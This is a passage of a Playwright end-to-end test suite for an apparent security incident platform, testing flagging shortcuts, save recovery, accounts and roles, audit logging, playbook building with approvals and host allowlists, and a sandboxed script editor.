  await expect(indicatorFilter).toHaveValue('185.220.* type:domain')
  await page.locator('main').getByRole('combobox').filter({ hasText: 'Any verdict' }).selectOption('flagged')
  await expect(indicatorFilter).toHaveValue('185.220.* type:domain verdict:>=suspicious')
  await indicatorFilter.fill('')

  // Back to the incident.
  await page
    .getByRole('navigation', { name: 'Sections' })
    .getByRole('button', { name: 'Incidents', exact: true })
    .click()
  await list.locator('li', { hasText: 'WKS-FINANCE-01' }).getByRole('button').first().click()
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('keyboard shortcuts: F flags the row under the pointer, C comments, ? lists them', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'Malware Analysis', exact: true }).click()
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  // The tab may have just been drawn: read the flag once the sample is there.
  await expect(sample).toBeVisible()
  const before = await flag.count()

  // F toggles the flag of the row under the pointer, as its menu would.
  await sample.hover()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before ? 0 : 1)
  await expect(page.getByText(before ? 'Flag removed: dropper.bin' : 'Flagged: dropper.bin')).toBeVisible()
  await page.keyboard.press('f')
  await expect(flag).toHaveCount(before)

  // C asks for the comment.
  await page.keyboard.press('c')
  const comment = page.getByRole('dialog', { name: 'Comment on the sample' })
  await expect(comment).toBeVisible()
  // Typing in a field is typing: no shortcut runs.
  await comment.getByRole('textbox').fill('fc?')
  await expect(comment.getByRole('textbox')).toHaveValue('fc?')
  await page.keyboard.press('Escape')
  await expect(comment).toHaveCount(0)
  await expect(flag).toHaveCount(before)

  // The menu shows the keys; "?" and the header button list every shortcut.
  await sample.click({ button: 'right' })
  await expect(page.getByRole('menuitem', { name: /flag/i }).first()).toContainText('F')
  await page.keyboard.press('Escape')
  await page.keyboard.press('?')
  const help = page.getByRole('dialog', { name: 'Keyboard shortcuts' })
  await expect(help).toContainText('Flag the row under the pointer')
  await page.keyboard.press('Escape')
  await expect(help).toHaveCount(0)
  await page.getByRole('button', { name: 'Keyboard shortcuts' }).click()
  await expect(help).toBeVisible()
  await page.keyboard.press('Escape')

  // Nothing to flag under the pointer: said, not guessed.
  await page.getByRole('banner').hover()
  await page.keyboard.press('f')
  await expect(page.getByText('Nothing to flag under the pointer.')).toBeVisible()
})

test("saves are retried, merged with a colleague's, resumed after the session expires; a removed flag comes back", async () => {
  const incidentId = decodeURIComponent(new URL(page.url()).pathname.split('/incident/')[1] ?? '')
  expect(incidentId).not.toBe('')
  const stored = async () => (await page.request.get(`/api/incidents/${incidentId}`)).json()
  const storedFlags = async () => Object.keys((await stored()).flags ?? {}).length
  const sample = page.getByRole('list', { name: 'Samples' }).locator('li', { hasText: 'dropper.bin' })
  const flag = sample.getByLabel('Flagged')
  const toggle = async () => {
    await sample.hover()
    await page.keyboard.press('f')
  }
  const failSaves = (route) => (route.request().method() === 'PATCH' ? route.abort() : route.fallback())
  const unsaved = page.getByRole('alert').filter({ hasText: 'Changes not saved yet' })
  const before = await flag.count()
  const flagsBefore = await storedFlags()
  const other = before ? flagsBefore - 1 : flagsBefore + 1

  // A save that fails is said, kept, and sent when asked again.
  await page.route('**/api/incidents/*', failSaves)
  await toggle()
  await expect(flag).toHaveCount(before ? 0 : 1)
  await expect(unsaved).toBeVisible()
  expect(await storedFlags()).toBe(flagsBefore)
  await page.unroute('**/api/incidents/*', failSaves)
  await unsaved.getByRole('button', { name: 'Retry now' }).click()
  await expect(unsaved).toHaveCount(0)
  await expect.poll(storedFlags).toBe(other)

  // A colleague writes to the same incident meanwhile: both changes are kept.
  const note = await page.request.post(`/api/incidents/${incidentId}/notes`, {
    data: { text: 'note from a colleague' },
  })
  expect(note.status()).toBe(201)
  await toggle()
  await expect(flag).toHaveCount(before)
  await expect.poll(storedFlags).toBe(flagsBefore)
  expect((await stored()).notes.map((item) => item.text)).toContain('note from a colleague')

  // The session ends with a change still to save: signing in again saves it.
  await page.route('**/api/incidents/*', failSaves)
  await toggle()
  await expect(unsaved).toBeVisible()
  await page.request.post('/api/auth/logout')
  await page.unroute('**/api/incidents/*', failSaves)
  await unsaved
    .getByRole('button', { name: 'Retry now' })
    .click({ timeout: 2000 })
    .catch(() => {})
  const expired = page.getByRole('dialog', { name: 'Session expired' })
  await expect(expired).toContainText('not saved yet')
  await expired.getByLabel('Password of admin').fill(ADMIN.password)
  await expired.getByRole('button', { name: 'Sign in again' }).click()
  await expect(expired).toHaveCount(0)
  await expect.poll(storedFlags).toBe(other)
  await expect(unsaved).toHaveCount(0)

  // Removing a flag can be undone.
  if (!(await flag.count())) await toggle()
  await expect(flag).toHaveCount(1)
  await toggle()
  await expect(flag).toHaveCount(0)
  await page.getByRole('button', { name: 'Undo' }).last().click()
  await expect(flag).toHaveCount(1)
  if (!before) {
    await toggle()
    await expect(flag).toHaveCount(0)
  }
  await expect.poll(storedFlags).toBe(flagsBefore)
})

test('an admin manages accounts; the audit log is written by the server', async ({ browser }) => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Accounts').click()

  // A new analyst, then renamed, promoted and given another password from the pencil.
  await settings.locator('#add-username').fill('anna')
  await settings.locator('#add-password').fill('first-secret')
  await settings.getByRole('button', { name: 'Add user' }).click()
  const accounts = settings.getByRole('list', { name: 'Accounts' })
  const anna = accounts.getByRole('listitem').filter({ hasText: 'anna' })
  await expect(anna).toContainText('Analyst')
  await anna.getByRole('button', { name: 'Edit user anna' }).click()
  const edit = page.getByRole('dialog', { name: 'Account: anna' })
  await edit.locator('#edit-username').fill('anna.b')
  await edit.getByRole('checkbox', { name: /^Admin/ }).check()
  await edit.locator('#edit-password').fill('second-secret')
  await edit.getByRole('button', { name: 'Save changes' }).click()
  await expect(edit).toHaveCount(0)
  const renamed = accounts.getByRole('listitem').filter({ hasText: 'anna.b' })
  // Roles add up: the account is an analyst and an admin.
  await expect(renamed.getByLabel('Roles')).toHaveText('AnalystAdmin')

  // The account signs in with its new name and password, and changes its own password.
  const other = await browser.newPage()
  await other.goto('/')
  await other.fill('#login-username', 'anna.b')
  await other.fill('#login-password', 'second-secret')
  await other.click('button[type=submit]')
  await other.getByRole('button', { name: 'Open platform settings' }).click()
  const theirs = other.getByRole('region', { name: 'Settings' })
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('My account').click()
  await theirs.locator('#own-current-password').fill('second-secret')
  await theirs.locator('#own-new-password').fill('third-secret')
  await theirs.locator('#own-confirm-password').fill('third-secret')
  await theirs.getByRole('button', { name: 'Change password' }).click()
  await expect(theirs.getByRole('status')).toContainText('Password changed')

  // Disabled by the admin: the open session is over at its next request.
  await renamed.getByRole('button', { name: 'Edit user anna.b' }).click()
  const again = page.getByRole('dialog', { name: 'Account: anna.b' })
  await again.getByRole('checkbox', { name: /^Disabled/ }).check()
  await again.getByRole('button', { name: 'Save changes' }).click()
  await expect(renamed).toContainText('Disabled')
  await theirs.getByRole('navigation', { name: 'Settings sections' }).getByText('Audit log').click()
  await expect(other.getByRole('dialog', { name: 'Session expired' })).toBeVisible()
  await other.close()

  // The admin cannot lock themselves out.
  await accounts
    .getByRole('listitem')
    .filter({ hasText: 'You' })
    .getByRole('button', { name: /^Edit user/ })
    .click()
  const own = page.getByRole('dialog', { name: `Account: ${ADMIN.username}` })
  await expect(own.getByRole('checkbox', { name: /^Admin/ })).toBeDisabled()
  await expect(own.getByRole('checkbox', { name: /^Analyst/ })).toBeEnabled()
  await expect(own.getByRole('checkbox', { name: /^Disabled/ })).toBeDisabled()
  await own.getByRole('button', { name: 'Cancel' }).click()

  // Everything above is in the audit log, recorded by the server.
  await sections.getByText('Audit log').click()
  for (const text of ['user.create', 'renamed from "anna"', 'password reset', 'user.password', 'disabled']) {
    await expect(settings.getByText(text).first()).toBeVisible()
  }
  // It cannot be written from the browser.
  const forged = await page.request.post('/api/audit', { data: { action: 'incident.delete', details: 'not me' } })
  expect(forged.status()).toBe(400)

  await sections.getByText('Accounts').click()
  await renamed.getByRole('button', { name: 'Delete user anna.b' }).click()
  await expect(renamed).toHaveCount(0)
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('roles are tags: an account sees and does what its roles grant together', async ({ browser }) => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Accounts').click()
  const accounts = settings.getByRole('list', { name: 'Accounts' })

  // Rita reads and manages the rule sets; Otto reads the audit log and nothing else.
  const add = async (name, roles) => {
    await settings.locator('#add-username').fill(name)
    await settings.locator('#add-password').fill('role-secret')
    for (const role of ['Viewer', 'Analyst', 'Rules', 'Audit', 'Admin']) {
      await settings.locator(`#add-role-${role.toLowerCase()}`).setChecked(roles.includes(role))
    }
    await settings.getByRole('button', { name: 'Add user' }).click()
    await expect(accounts.getByRole('listitem').filter({ hasText: name }).getByLabel('Roles')).toHaveText(
      roles.join(''),
    )
  }
  await add('rita', ['Viewer', 'Rules'])
  await add('otto', ['Audit'])
  // An account needs at least one role.
  await settings.locator('#add-role-analyst').uncheck()
  await expect(settings.getByRole('button', { name: 'Add user' })).toBeDisabled()
  await settings.locator('#add-role-analyst').check()
  await settings.getByRole('button', { name: 'Close settings' }).click()

  const signIn = async (name) => {
    const other = await browser.newPage()
    await other.goto('/')
    await other.fill('#login-username', name)
    await other.fill('#login-password', 'role-secret')
    await other.click('button[type=submit]')
    await expect(other.getByRole('button', { name: 'Open platform settings' })).toBeVisible()
    return other
  }

  // A viewer with the rules role: reads the incidents, creates none, manages the rule sets.
  const rita = await signIn('rita')
  const ritaRail = rita.getByRole('navigation', { name: 'Sections' })
  await expect(ritaRail.getByRole('button', { name: /incidents/i })).toBeVisible()
  await expect(ritaRail.getByRole('button', { name: 'Audit log' })).toHaveCount(0)
  await expect(ritaRail.getByRole('button', { name: 'Users' })).toHaveCount(0)
  await expect(rita.getByText('read-only', { exact: true })).toBeVisible()
  await expect(rita.getByRole('button', { name: 'New incident' })).toHaveCount(0)
  expect((await rita.request.post('/api/incidents', { data: { id: 'by-rita', data: {} } })).status()).toBe(403)
  await rita.getByRole('button', { name: 'Open platform settings' }).click()
  const ritaSections = rita.getByRole('navigation', { name: 'Settings sections' })
  await expect(ritaSections.getByText('YARA rules')).toBeVisible()
  await expect(ritaSections.getByText('Detection rules')).toBeVisible()
  for (const hidden of ['Accounts and roles', 'API keys', 'Audit log', 'Storage', 'Backup', 'Threat intelligence']) {
    await expect(ritaSections.getByText(hidden, { exact: true })).toHaveCount(0)
  }
  await ritaSections.getByText('My account').click()
  await expect(rita.getByRole('region', { name: 'Settings' }).getByLabel('Roles')).toHaveText('ViewerRules')
  const rule = { name: 'by-rita', source: 'rule by_rita { condition: false }', enabled: true }
  const made = await rita.request.post('/api/yara-rules', { data: rule })
  expect(made.status()).toBe(201)
  expect((await rita.request.delete(`/api/yara-rules/${(await made.json()).id}`)).status()).toBe(204)
  await rita.close()

  // The audit role alone: no incidents, no artifacts; the audit log, and one's own account.
  const otto = await signIn('otto')
  await expect(otto.getByText('Nothing to open here')).toBeVisible()
  const ottoRail = otto.getByRole('navigation', { name: 'Sections' })
  await expect(ottoRail.getByRole('button')).toHaveCount(2) // the audit log and the settings
  await ottoRail.getByRole('button', { name: 'Audit log' }).click()
  const ottoSettings = otto.getByRole('region', { name: 'Settings' })
  await expect(ottoSettings.getByText('user.create').first()).toBeVisible()
  await expect(ottoSettings.getByRole('button', { name: /clear/i })).toHaveCount(0)
  await expect(ottoSettings.getByRole('navigation', { name: 'Settings sections' }).getByRole('button')).toHaveText([
    'My account',
    'Audit log',
  ])
  expect((await otto.request.get('/api/incidents')).status()).toBe(403)
  await otto.close()

  // Leave the accounts as they were.
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  await sections.getByText('Accounts').click()
  for (const name of ['rita', 'otto']) {
    await accounts
      .getByRole('listitem')
      .filter({ hasText: name })
      .getByRole('button', { name: `Delete user ${name}` })
      .click()
    await expect(accounts.getByRole('listitem').filter({ hasText: name })).toHaveCount(0)
  }
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('a playbook is drawn on the canvas, checked by the server and saved as a version', async () => {
  test.setTimeout(240_000) // a long story, and the runners of CI are slower than a desk
  const before = page.url()
  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await expect(page).toHaveURL(/\/automation\/playbooks$/)
  // The playbooks Nik ships are there from the first start, off: nothing runs until someone turns one on.
  const shipped = area.getByRole('row').filter({ hasText: 'shipped with Nik' })
  await expect(shipped).toHaveCount(5)
  await expect(shipped.filter({ hasText: 'Phishing triage' })).toHaveCount(1)
  const listed = (await (await page.request.get('/api/automation/playbooks')).json()).playbooks
  expect(listed.filter((playbook) => playbook.enabled)).toEqual([])

  await area.getByRole('button', { name: 'New playbook' }).first().click()
  const create = page.getByRole('dialog', { name: 'New playbook' })
  await create.getByLabel('Name').fill('Note on high')
  await create.getByRole('button', { name: 'Create' }).click()
  await expect(page).toHaveURL(/\/automation\/playbooks\/[0-9a-f]+$/)
  await expect(area.getByRole('heading', { name: 'Note on high' })).toBeVisible()
  await expect(area.getByText('playbook · no version yet')).toBeVisible()

  const canvas = area.getByTestId('playbook-canvas')
  const library = area.getByRole('complementary', { name: 'Node library' })
  const inspector = area.getByRole('complementary', { name: 'Inspector' })
  const nodes = canvas.locator('.react-flow__node')
  await expect(nodes).toHaveCount(1)
  await expect(nodes.first()).toContainText('by hand')

  // The trigger: an event of Nik, besides being run by hand.
  await nodes.first().click()
  await inspector.getByLabel('On an event').selectOption('incident.created')
  await expect(nodes.first()).toContainText('incident.created · by hand')

  // A node added from the library comes after the selected one, joined to it.
  await library.getByLabel('Search nodes').fill('condit')
  await library.getByRole('button', { name: 'Condition', exact: true }).click()
  await library.getByLabel('Search nodes').fill('')
  await expect(nodes).toHaveCount(2)
  await expect(canvas.locator('.react-flow__edge')).toHaveCount(1)
  // "Pick a value" writes the expression; what is typed wrong says where.
  await inspector.getByRole('button', { name: 'Pick a value for Comparison 1: what to compare' }).click()
  await page
    .getByRole('dialog', { name: 'Pick a value' })
    .getByText('trigger.incident.severity', { exact: true })
    .click()
  await expect(inspector.getByRole('textbox', { name: 'Comparison 1: what to compare' })).toHaveValue(
    '{{ trigger.incident.severity }}',
  )
  await inspector.getByRole('textbox', { name: 'Comparison 1: with what' }).fill('{{ trigger.incident.severity ')
  await expect(inspector.getByText('The expression is not closed: add }}')).toBeVisible()
  await inspector.getByRole('textbox', { name: 'Comparison 1: with what' }).fill('high')

  await library.getByRole('button', { name: 'Add a note', exact: true }).click()
  await expect(nodes).toHaveCount(3)
  await expect(canvas.locator('.react-flow__edge')).toHaveCount(2)
  await expect(inspector.getByRole('group', { name: 'Port then' })).toBeVisible()

  // The draft saves itself: a reload finds the three nodes.
  await expect(area.getByText('draft saved')).toBeVisible()
  await page.reload()
  await expect(nodes).toHaveCount(3)

  // Not a version yet: the note has no text. The server says what and where.
  await area.getByRole('button', { name: 'Save as version 1' }).click()
  await expect(page.getByText('One thing to fix before this can be a version.')).toBeVisible()
  await expect(inspector.getByText('"text" is required')).toBeVisible()
  await expect(nodes.filter({ hasText: 'Add a note' })).toContainText('1 to fix')
  await inspector
    .getByLabel(/^text/)
    .fill('Severity is {{ trigger.incident.severity }}: look at {{ trigger.incident.name }}')

  // An "End" on the other branch, drawn from the inspector without a pointer; then undo and redo.
  await library.getByRole('button', { name: 'End', exact: true }).click()
  await expect(nodes).toHaveCount(4)
  await area.getByRole('button', { name: 'Node list' }).click()
  const table = area.getByRole('table', { name: 'The nodes of the playbook' })
  await expect(table.getByRole('row')).toHaveCount(5)
  await table.getByRole('button', { name: 'Condition' }).click()
  await inspector.getByLabel('Draw an edge "no" to').selectOption({ label: 'End' })
  await expect(table.getByRole('row', { name: /^Condition/ })).toContainText('no → End')
  await area.getByRole('button', { name: 'Undo' }).click()
  await expect(table.getByRole('row', { name: /^Condition/ })).not.toContainText('no → End')
  await area.getByRole('button', { name: 'Redo' }).click()
  await expect(table.getByRole('row', { name: /^Condition/ })).toContainText('no → End')
  await area.getByRole('button', { name: 'Tidy up' }).click()
  await area.getByRole('button', { name: 'Node list' }).click()

  await area.getByRole('button', { name: 'Save as version 1' }).click()
  await expect(page.getByText('Version 1 saved: it is what runs from now on.')).toBeVisible()
  await expect(area.getByText('playbook · version 1')).toBeVisible()
  await expect(area.getByRole('button', { name: 'Save as version 2' })).toBeDisabled()

  // Versions; then what the playbook may reach, behind the double check.
  await area.getByRole('radio', { name: 'Versions' }).click()
  await expect(page).toHaveURL(/\/versions$/)
  await expect(area.getByRole('table', { name: 'Versions of Note on high' }).getByRole('row')).toHaveCount(2)
  await area.getByRole('radio', { name: 'Settings' }).click()
  const network = area.getByRole('region', { name: 'Network' })
  await network.getByLabel('Add a host').fill('https://Hooks.Example.org/path')
  await network.getByRole('button', { name: 'Add' }).click()
  await expect(network.getByRole('listitem').filter({ hasText: 'hooks.example.org' })).toBeVisible()
  await network.getByRole('radio', { name: 'Any host' }).click()
  const check = page.getByRole('dialog', { name: 'Let this playbook reach any host?' })
  const allow = check.getByRole('button', { name: 'Allow any host' })
  await expect(allow).toBeDisabled()
  await check.getByRole('checkbox').check()
  await check.locator('#data-guard-name').fill('note on high')
  await expect(allow).toBeDisabled() // the name, exactly as it is written
  await check.locator('#data-guard-name').fill('Note on high')
  await allow.click()
  await expect(check).toBeHidden()
  await expect(network.getByText('any host', { exact: true })).toBeVisible()
  await network.getByRole('radio', { name: 'Listed hosts only' }).click()
  await expect(network.getByText('any host', { exact: true })).toBeHidden()
  // A class of data is opened the same way, and closed with one click.
  const data = area.getByRole('region', { name: 'Data that may leave' })
  await data.getByRole('button', { name: 'Open: E-mail addresses' }).click()
  const open = page.getByRole('dialog', { name: 'Let e-mail addresses leave Nik in this playbook?' })
  await expect(open).toContainText('hooks.example.org')
  await open.getByRole('checkbox').check()
  await open.locator('#data-guard-name').fill('Note on high')
  await open.getByRole('button', { name: 'Allow e-mail addresses' }).click()
  await expect(data.getByText('may leave', { exact: true })).toBeVisible()
  await data.getByRole('button', { name: 'Close: E-mail addresses' }).click()
  await expect(data.getByText('may leave', { exact: true })).toBeHidden()

  // The list: on, with its trigger and version. Settings has the switch for everything.
  await area.getByRole('button', { name: 'All playbooks' }).click()
  const row = area.getByRole('row').filter({ hasText: 'Note on high' })
  await expect(row).toContainText('incident.created')
  await row.getByRole('switch').click()
  await expect(row.getByRole('switch')).toBeChecked()
  await area.getByRole('button', { name: 'Close automations' }).click()
  await expect(area).toBeHidden()

  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Stop all').click()
  await expect(page).toHaveURL(/\/settings\/automation\/stop-all$/)
  await expect(settings.getByText('running')).toBeVisible()
  await expect(settings.getByText('alive')).toBeVisible()
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Network and data').click()
  await settings.getByLabel('Add a host').fill('intel.example.org')
  await settings.getByRole('button', { name: 'Add' }).click()
  await expect(settings.getByText('intel.example.org can be reached by every playbook.')).toBeVisible()
  await settings.getByRole('button', { name: 'Close settings' }).click()
  // The area was reloaded on its own address: back to the incident the next steps work on.
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a playbook runs on an incident: the approval is asked where the incident is, the run shows what happened', async () => {
  test.setTimeout(240_000) // the worker takes a step every second or so, and the story has many
  const before = page.url()
  const incidentId = decodeURIComponent(new URL(before).pathname.split('/')[2])
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')

  // A playbook that asks a person, then writes a note (made through the API: the canvas has its own test).
  const made = await page.request.post('/api/automation/playbooks', { data: { name: 'Ask then note' } })
  expect(made.status()).toBe(201)
  const playbookId = (await made.json()).id
  const graph = {
    nodes: [
      { id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: { manual: true } },
      {
        id: 'ask',
        kind: 'approval',
        name: 'Ask first',
        position: { x: 40, y: 160 },
        config: { question: 'Add a note to {{ trigger.incident.name }}?', detail: { why: 'a test' } },
      },
      {
        id: 'note',
        kind: 'action',
        name: 'Add a note',
        position: { x: 40, y: 280 },
        config: { action: 'nik.add-note', args: { text: 'Approved by {{ ask.by }}: {{ ask.comment }}' } },
      },
    ],
    edges: [
      { from: 'start', to: 'ask' },
      { from: 'ask', port: 'approved', to: 'note' },
    ],
  }
  const saved = await page.request.post(`/api/automation/playbooks/${playbookId}/versions`, { data: { graph } })
  expect(saved.status()).toBe(201)

  // Run by hand, from the incident's own menu.
  await page
    .locator('aside nav[aria-label="Incidents"] li')
    .filter({ hasText: 'WKS-FINANCE-01' })
    .click({ button: 'right' })
  await page.getByRole('menu').getByRole('menuitem', { name: 'Run a playbook…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Run a playbook' })
  await expect(dialog.locator('#run-incident')).toHaveValue(incidentId)
  await dialog.locator('#run-playbook').selectOption(playbookId)
  await dialog.getByRole('button', { name: 'Run', exact: true }).click()

  // The run: the same canvas, each node by what happened to it; it waits for a person.
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  const area = page.getByRole('region', { name: 'Automations' })
  const status = area.getByRole('status', { name: 'Status of the run' })
  await expect(status).toHaveText('waiting for approval', { timeout: 15_000 })
  await expect(area.getByTestId('rf__node-ask')).toContainText('waiting')
  await expect(area.getByTestId('rf__node-note')).toContainText('pending')
  await expect(area.getByRole('region', { name: /^Approval asked: Add a note to WKS-FINANCE-01/ })).toContainText(
    'a test',
  )

  // The rail counts what waits, and the incident shows the question above its tabs.
  await area.getByRole('button', { name: 'Close automations' }).click()
  await expect(page.getByRole('button', { name: 'Automations (1 approval waits)' })).toBeVisible()
  const banner = page.getByRole('region', { name: /^Approval asked: Add a note to WKS-FINANCE-01/ })
  await banner.getByLabel('A comment with the answer').fill('looks right')
  await banner.getByRole('button', { name: 'Approve' }).click()
  await expect(page.getByText('Approved: the run goes on.')).toBeVisible()
  await expect(banner).toBeHidden()
  await expect(page.getByRole('button', { name: 'Automations', exact: true })).toBeVisible()

  // The incident's Automation tab lists its runs; a run opens on its page.
  await tabs.getByRole('button', { name: 'Automation', exact: true }).click()
  const onIncident = page.getByRole('table', { name: 'Runs on this incident' })
  await expect(onIncident.getByRole('row').filter({ hasText: 'Ask then note' })).toContainText('done', {
    timeout: 15_000,
  })
  await onIncident.getByRole('button', { name: 'Ask then note' }).click()
  await expect(status).toHaveText('done')
  const steps = area.getByRole('complementary', { name: 'Steps of the run' })
  await expect(steps).toContainText('“looks right”')
  await steps.getByRole('button', { name: /Add a note/ }).click()
  await expect(steps.getByText('Came out')).toBeVisible()
  await expect(steps.getByText('Went in')).toBeVisible()

  // From the playbook's page: a dry run asks nobody and writes nothing.
  await area.getByRole('button', { name: 'version 1' }).click()
  await expect(area.getByRole('heading', { name: 'Ask then note' })).toBeVisible()
  await area.getByRole('button', { name: 'Run…' }).click()
  await dialog.locator('#run-incident').selectOption(incidentId)
  await dialog.getByRole('checkbox').check()
  await dialog.getByRole('button', { name: 'Start the dry run' }).click()
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  await expect(area.getByText('dry run', { exact: true })).toBeVisible()
  await expect(status).toHaveText('done', { timeout: 15_000 })
  await steps.getByRole('button', { name: /Ask first/ }).click()
  await expect(steps).toContainText('"by": "dry run"')

  // Every run, newest first; then the approvals answered lately.
  await area.getByRole('button', { name: 'All runs' }).click()
  const all = area.getByRole('table', { name: 'Runs' })
  await expect(all.getByRole('row')).toHaveCount(3)
  await expect(all.getByRole('row').nth(1)).toContainText('dry run')
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Approvals' }).click()
  await expect(area.getByText('Nothing waits for an answer')).toBeVisible()
  await expect(area.getByRole('region', { name: 'Answered lately' })).toContainText('looks right')

  // A trigger: the playbook drawn on the canvas waits for incidents of high severity.
  const created = await page.request.post('/api/incidents', {
    data: { id: 'e2e-automation', name: 'E2E high', severity: 'high', data: {} },
  })
  expect(created.status()).toBe(201)
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Runs' }).click()
  const triggered = all.getByRole('row').filter({ hasText: 'Note on high' })
  await expect(async () => {
    await area.getByRole('button', { name: 'Refresh' }).click()
    await expect(triggered).toContainText('done', { timeout: 1000 })
  }).toPass({ timeout: 20_000 })
  await expect(triggered).toContainText('incident.created')
  expect((await page.request.delete('/api/incidents/e2e-automation')).status()).toBe(204)

  // Back on the incident: the note the playbook wrote is marked, the dry run wrote none.
  await page.goto(before)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.getByText('Approved by admin: looks right')).toBeVisible()
  await expect(page.getByRole('button', { name: 'automation', exact: true })).toHaveCount(1)
})

test('a script is written, tested in the sandbox, saved as a version and offered as a node', async () => {
  test.setTimeout(240_000) // a long story, and the runners of CI are slower than a desk
  const before = page.url()
  // The sandbox runs in CI (and wherever E2E_SANDBOX_URL names one); without it, what needs one is checked to be refused.
  const sandbox = Boolean(process.env.E2E_SANDBOX_URL)
  /** Replace what a code editor holds. */
  const write = async (editor, text) => {
    await editor.click()
    await page.keyboard.press('ControlOrMeta+a')
    await page.keyboard.insertText(text)
  }

  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
  await expect(page).toHaveURL(/\/automation\/scripts$/)
  const shipped = area.getByRole('table', { name: 'Scripts' }).getByRole('row').filter({ hasText: 'GroupByField' })
  await expect(shipped).toContainText('in the library')
  await expect(shipped).toContainText('shipped with Nik')

  // A name is how nodes call the script: a capital letter, letters and digits.
  await area.getByRole('button', { name: 'New script' }).click()
  const create = page.getByRole('dialog', { name: 'New script' })
  await create.getByLabel('Name').fill('count words')
  await expect(create.getByRole('alert')).toContainText('A capital letter')
  await expect(create.getByRole('button', { name: 'Create' })).toBeDisabled()
  await create.getByLabel('Name').fill('CountWords')
  await create.getByLabel('Description').fill('How many words a text has')
  await create.getByRole('button', { name: 'Create' }).click()
  await expect(page).toHaveURL(/\/automation\/scripts\/[0-9a-f]+$/)
  await expect(area.getByRole('heading', { name: 'CountWords' })).toBeVisible()
  await expect(area.getByText('no version yet: not in the library')).toBeVisible()

  // The code, what it takes and gives, and its test.
  const code = area.getByRole('textbox', { name: 'Code of the script' })
  await write(code, 'print("no function here")\n')
  await expect(area.getByRole('alert', { name: 'Before the script can be tested' })).toContainText('def main(args)')
  await expect(area.getByRole('button', { name: 'Run the test' })).toBeDisabled()
  await write(
    code,
    'def main(args):\n    words = str(args.get("text", "")).split()\n    print("counting", len(words))\n    return {"count": len(words)}\n',
  )
  await area.getByLabel('Argument 1: name').fill('text')
  await area.getByLabel('Output 1: name').fill('count')
  await area.getByLabel('Output 1: type').selectOption('number')
  await write(area.getByRole('textbox', { name: 'Arguments of the test' }), '{"text": "one two three"')
  await expect(area.getByRole('alert', { name: 'Before the script can be tested' })).toContainText('Not JSON')
  await write(area.getByRole('textbox', { name: 'Arguments of the test' }), '{"text": "one two three"}')
  await write(area.getByRole('textbox', { name: 'What the test expects' }), '{"count": 2}')
  await expect(area.getByText('draft saved')).toBeVisible()
  // The draft is the server's: a reload finds the code.
  await page.reload()
  await expect(code).toContainText('counting')

  if (sandbox) {
    const result = area.getByRole('status', { name: 'Result of the test' })
    // The test runs the draft: it returns 3, the test expected 2.
    await area.getByRole('button', { name: 'Run the test' }).click()
    await expect(result).toContainText('failed')
    await expect(result).toContainText('did not return what the test expects')
    await expect(result).toContainText('counting 3')
    // A version needs the test to pass.
    await area.getByRole('button', { name: 'Save as version 1' }).click()
    await expect(page.getByText(/^The test does not pass/)).toBeVisible()
    await write(area.getByRole('textbox', { name: 'What the test expects' }), '{"count": 3}')
    await area.getByRole('button', { name: 'Run the test' }).click()
    await expect(result).toContainText('passed')
    await area.getByRole('button', { name: 'Save as version 1' }).click()
    await expect(page.getByText('Version 1 saved: CountWords is in the library of nodes.')).toBeVisible()
    await expect(area.getByText('script · version 1')).toBeVisible()
    await expect(area.getByRole('button', { name: 'Save as version 2' })).toBeDisabled()

    // What the draft changes from a version, line by line; the version can be put back.
    await write(
      code,
      'def main(args):\n    words = str(args.get("text", "")).split()\n    return {"count": len(words)}\n',
    )
    await expect(area.getByText('draft changed')).toBeVisible()
    await area.getByRole('button', { name: 'See version 1' }).click()
    const version = page.getByRole('dialog', { name: 'Version 1' })
    await expect(version).toContainText('0 lines added, 1 removed')
    await expect(version.getByLabel('What the draft changes from version 1')).toContainText(
      '-     print("counting", len(words))',
    )
    await version.getByRole('button', { name: 'Put version 1 back into the draft' }).click()
    await expect(code).toContainText('counting')

    // The script is now a node of the library.
    await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
    await area.getByRole('button', { name: 'Note on high' }).click()
    const library = area.getByRole('complementary', { name: 'Node library' })
    await library.getByLabel('Search nodes').fill('countwords')
    await expect(library.getByRole('button', { name: 'CountWords' })).toBeVisible()
  } else {
    await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
    await expect(area.getByRole('region', { name: 'The box every script runs in' }).getByRole('alert')).toContainText(
      'The sandbox is not configured',
    )
